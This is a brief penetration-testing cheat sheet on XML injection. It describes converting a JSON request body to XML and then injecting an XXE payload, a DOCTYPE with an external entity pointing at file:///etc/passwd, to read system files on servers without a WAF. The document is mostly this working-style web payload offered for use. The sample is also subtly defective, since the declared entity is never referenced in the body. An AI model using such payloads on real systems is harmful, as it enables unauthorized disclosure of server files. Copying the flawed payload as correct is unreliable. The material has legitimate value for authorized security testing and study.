# XMLI METHOD

Check the Contenttype that is allowed.
	If application/json change to application/xml //or other option

Change Post data from json to xml (Conten-Type Converter Burp Extension)

## Simple Example
```
{
  "firstname":"Mike",
  "lastname":"hill",
  "Uid":"123"
 }
```
TO
```
<!--?xml version="1.0"?-->
<userinfo>
  <firstname>
  Mike
  </firstname>
  <lastname>
  hill
  </lastname>
  <Uid>
  123
  </Uid>
</userinfo>
```

If it works, try different approaches/payloads
e.g.
```
<!--?xml version="1.0"?-->
<!DOCTYPE replace [<!ENTITY asd SYSTEM "file:///etc/passwd"> ]>
<userinfo>
  <firstname>
  Mike
  </firstname>
  <lastname>
  hill
  </lastname>
  <Uid>
  123
  </Uid>
</userinfo>
```
Read the etc/passwd file if there is no waf
